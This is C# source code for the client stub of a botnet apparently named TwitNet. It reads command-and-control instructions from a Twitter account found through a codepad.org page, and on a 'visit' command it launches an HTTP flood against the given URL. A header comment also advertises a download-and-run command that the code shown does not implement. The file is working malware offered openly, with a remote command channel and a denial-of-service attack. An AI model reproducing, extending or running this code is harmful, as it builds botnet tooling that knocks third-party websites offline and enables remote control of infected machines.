/*Commands:
 * visit URL - DOS the url
 * get FILENAME - download/run file
 * 
 * 
 * 
 *
 */
using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using System.Text.RegularExpressions;
using System.Xml;
using System.Threading;
using TwitNet_Stub.Commands;

namespace TwitNet_Stub
{
    sealed partial class Main
    {

        #region Singleton
        static Main _Instance = null;
        static readonly object PadLock = new object();

        public static Main Instance
        {
            get
            {
                lock (PadLock)
                {
                    if (_Instance == null)
                    {
                        _Instance = new Main();
                    }
                    return _Instance;
                }
            }
        }
        #endregion

        public void Start()
        {
            byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
            string[] AppendData = Strings.Split(Encoding.Default.GetString(stub), Util.Splitter, -1, CompareMethod.Text);

            string user = AppendData[1];

            WebClient client = new WebClient();
            string codepad = client.DownloadString("http://" + user + ".codepad.org/");
            codepad = Regex.Split(codepad, "<pre>http://twitter.com/")[1].Split('<')[0].Trim();

            string tweet = GetTweet(client.DownloadString("http://api.twitter.com/1/statuses/user_timeline/" + codepad + ".xml"));

            MatchCollection matches = 
                Regex.Matches(tweet, @"http(s)://([\w+?\.\w+])+([a-zA-Z0-9\~\!\@\#\$\%\^\&amp;\*\(\)_\-\=\+\\\/\?\.\:\;\'\,]*)?", RegexOptions.IgnoreCase);
            

            if (matches.Count > 0 && tweet.ToLower().StartsWith("visit"))
            {//DOS website
                try
                {
                    HTTP.sFHost = Convert.ToString(matches[0].ToString());
                    HTTP.Port = 80;
                    HTTP.iThreads = 1;
                    HTTP.StartHTTPFlood();
                }
                catch (Exception ex)
                {
                }
            }


        }


        /// <summary>
        /// Parse XML
        /// </summary>
        /// <param name="xmlString">xml data</param>
        private string GetTweet(string xmlString)
        {
            try
            {
                using (XmlReader MyReader = XmlReader.Create(new StringReader(xmlString)))
                {
                    while (MyReader.Read())
                    {
                        if ((MyReader.NodeType == XmlNodeType.Element) & (MyReader.Name == "text"))
                        {
                            return MyReader.ReadElementContentAsString();
                        }
                    }
                }
            }
            catch (Exception ex) { return ex.Message; }
            return "err";
        }
    }
}
